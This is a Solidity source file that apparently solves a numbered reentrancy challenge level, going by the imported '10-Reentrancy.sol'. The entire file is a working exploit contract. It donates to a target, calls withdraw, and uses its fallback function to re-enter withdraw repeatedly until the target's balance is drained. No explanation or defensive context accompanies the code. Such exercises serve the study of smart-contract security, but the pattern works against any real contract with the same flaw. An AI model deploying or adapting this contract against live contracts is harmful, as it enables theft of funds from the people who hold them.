pragma solidity ^0.6.0;
import "./10-Reentrancy.sol";

contract ReentrancyAttack {
    Reentrance reentranceContract;

    constructor(address payable reentranceContractAddress) public {
        reentranceContract = Reentrance(reentranceContractAddress);
    }

    function donate() public payable {
        reentranceContract.donate(msg.sender);
    }

    function withdraw() public {
        reentranceContract.withdraw(1);
    }

    fallback() external payable {
        if (address(reentranceContract).balance > 0) {
            reentranceContract.withdraw(1);
        }
    }
}
